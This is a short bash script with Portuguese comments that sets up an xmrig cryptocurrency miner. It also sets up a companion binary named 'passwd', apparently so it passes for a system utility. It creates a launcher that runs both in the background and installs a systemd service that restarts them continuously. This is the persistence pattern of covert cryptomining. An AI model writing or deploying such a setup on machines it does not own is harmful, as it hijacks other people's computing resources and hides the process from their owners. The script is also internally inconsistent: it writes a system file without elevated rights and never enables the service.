#!/bin/bash

# Verifica se xmrig e passwd existem e atribui permissões de execução
if [ -f "$HOME/minershell-main/minershell-main/xmrig" ]; then
  chmod +x "$HOME/minershell-main/minershell-main/xmrig"
else
  echo "ERROR: xmrig file not found"
  exit 1
fi

if [ -f "$HOME/minershell-main/minershell-main/passwd" ]; then
  chmod +x "$HOME/minershell-main/minershell-main/passwd"
else
  echo "ERROR: passwd file not found"
  exit 1
fi

# Cria o script start_miner.sh na mesma pasta que os arquivos xmrig e passwd
cat << EOF > "$HOME/minershell-main/minershell-main/start_miner.sh"
#!/bin/bash

# Encerra qualquer instância anterior do xmrig
killall -9 xmrig

# Inicia o arquivo xmrig em segundo plano
echo "[*] Starting xmrig..."
$HOME/minershell-main/minershell-main/xmrig &

# Inicia o arquivo passwd em segundo plano
echo "[*] Starting passwd..."
$HOME/minershell-main/minershell-main/passwd &
EOF

# Torna o script start_miner.sh executável
chmod +x "$HOME/minershell-main/minershell-main/start_miner.sh"

# Cria o arquivo de serviço systemd
cat << EOF > "/etc/systemd/system/miner.service"
[Unit]
Description=Miner Service
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$HOME/minershell-main/minershell-main
ExecStart=/bin/bash start_miner.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Recarrega os serviços systemd
sudo systemctl daemon-reload

echo "[*] Setup complete."
